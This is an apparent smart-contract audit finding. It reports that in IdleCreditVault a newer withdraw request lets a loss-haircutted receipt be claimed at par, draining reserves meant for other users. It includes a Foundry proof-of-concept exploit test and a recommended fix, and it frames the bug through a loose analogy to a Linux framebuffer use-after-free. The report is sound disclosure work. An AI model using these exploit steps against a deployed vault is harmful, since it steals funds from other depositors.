### Title
Loss-adjusted withdraw receipts escape the haircut once a newer request overwrites `lastWithdrawRequest`, letting users claim at par and draining funded reserves - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
The Linux bug is a lifetime-ordering flaw: `fb_info` is freed by `unregister_framebuffer()` and then dereferenced in `vesafb_remove()`; the fix was to read the needed state *before* the freeing call. The analog in `IdleCreditVault` is an epoch-pointer lifetime bug: the loss-adjusted claim path resolves the haircutted epoch exclusively through `lastWithdrawRequest[_user]`, but that pointer is overwritten ("freed") by every subsequent `requestWithdraw`. Once a newer request exists, the older haircutted epoch's receipt is orphaned from `lossRecoveryPriceByEpoch` and falls through to `_claimFundedWithdrawRequest`, which pays the entire `withdrawsRequests[_user]` aggregate **at par**.

### Finding Description
`requestWithdraw` stores the request epoch in `lastWithdrawRequest[_user]` and adds the amount to `withdrawsRequests[_user]` / `withdrawsRequestsByEpoch[_user][currentEpoch]` [1](#0-0) .

When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` funds only `pendingToFund < pendingBasis` and records the haircut in `lossRecoveryPriceByEpoch[epochNumber]` [2](#0-1) . The strategy only ever receives the reduced amount.

On claim, `claimWithdrawRequest` runs `_claimLossAdjustedWithdrawRequest` first [3](#0-2) , which looks up the haircut via `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — i.e., only the *latest* request epoch [4](#0-3) . If the user made any newer request in a later epoch, `lastWithdrawRequest` points at the new epoch where `lossRecoveryPriceByEpoch == 0`, so the loss path returns 0 and the haircutted receipt in `withdrawsRequests[_user]` is never cleared via `_clearWithdrawClaimForEpoch`.

Once the newer epoch also matures (`epochNumber > lastWithdrawRequest[_user]`), `_claimFundedWithdrawRequest` pays the *whole* aggregate `normalAmount = withdrawsRequests[_user]` — including the epoch-E portion that was supposed to be haircut — at full value [5](#0-4) . No guard re-checks whether any per-epoch bucket inside `withdrawsRequests` belongs to a loss epoch; `lossRecoveryPriceByEpoch` is consulted only via the single `lastWithdrawRequest` pointer.

### Impact Explanation
Direct theft / insolvency. The strategy was funded by the borrower with only `pendingToFund` for the loss epoch, but the attacker withdraws the un-haircutted basis. The excess is paid out of underlyings reserved for other users' funded claims (`_transferFundedClaim` draws from the same strategy balance). Loss socialization — the core invariant of `stopEpochWithDuration` — is bypassed by simply making one additional withdraw request; quantified loss equals `claimBasis_E * (1 - lossRecoveryPriceByEpoch[E])`, up to the full loss portion assigned to pending receipts.

### Likelihood Explanation
High. The attacker is an ordinary tranche-token holder performing two normal `requestWithdraw` calls across two epochs — no privileged role, no timing edge beyond waiting for the second epoch to mature. The trigger condition (a realized `stopEpochWithDuration` loss) is a routine protocol operation, and the escape works for both normal and APR0 receipts since both feed `lastWithdrawRequest`.

### Recommendation
Resolve loss-adjusted claims per-epoch rather than via `lastWithdrawRequest`: e.g., iterate/check `withdrawsRequestsByEpoch` and `apr0Users` against all epochs with nonzero `lossRecoveryPriceByEpoch`, or store a per-user bitmap/`minPendingLossEpoch` cleared only when that epoch's bucket is claimed. Alternatively, in `requestWithdraw`, refuse (or settle first) when `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]] != 0`, so a stale haircutted receipt cannot be shadowed by a newer request — mirroring the kernel fix of consuming `info->par` before the freeing call.

### Proof of Concept
```solidity
// Foundry test (extend test/foundry/IdleCreditVault.t.sol)
// Phases: epoch E-1 request -> loss epoch -> new request -> claim at par
function testLossAdjustedReceiptEscapesViaNewerRequest() external {
    uint256 amount = 10_000 * ONE_SCALE;
    uint256 mintedAA = idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // 1) Attacker requests withdraw; epoch E-1 ends, receipt enters epoch E
    cdoEpoch.requestWithdraw(mintedAA / 4, address(AAtranche));
    _startEpochAndCheckPrices(1);

    // 2) Epoch E ends with a realized loss: borrower funds only pendingToFund
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 activeBasis  = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 lossAmount   = (activeBasis + pendingBasis) / 10; // 10% total loss
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), repay);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 lossEpoch = strategy.epochNumber();
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, 0, cdoEpoch.epochDuration(), lossAmount);
    uint256 haircutPrice = strategy.lossRecoveryPriceByEpoch(lossEpoch);
    assertLt(haircutPrice, 1e18);

    // 3) Attacker makes a NEW request -> lastWithdrawRequest now points past lossEpoch
    cdoEpoch.requestWithdraw(mintedAA / 4, address(AAtranche));
    assertGt(strategy.lastWithdrawRequest(address(this)), lossEpoch);

    // 4) Run one more epoch so the funded-claim gate opens
    _startEpochAndCheckPrices(2);
    _stopEpochAndCheckPrices(2, initialProvidedApr, _expectedFundsEndEpoch());

    // 5) Claim: loss path skipped (price keyed to new epoch == 0),
    //    funded path pays full withdrawsRequests at par
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 claimed = IERC20Detailed(defaultUnderlying).balanceOf(address(this)) - balPre;

    // First receipt should have paid claimBasis*haircutPrice; it paid full basis instead
    uint256 firstBasis = mintedAA / 4;
    assertGt(claimed, firstBasis * haircutPrice / 1e18 + mintedAA / 4 - 1);
    // => attacker received ~firstBasis*(1-haircutPrice) more than funded,
    //    draining underlying reserved for other claimants.
}
```
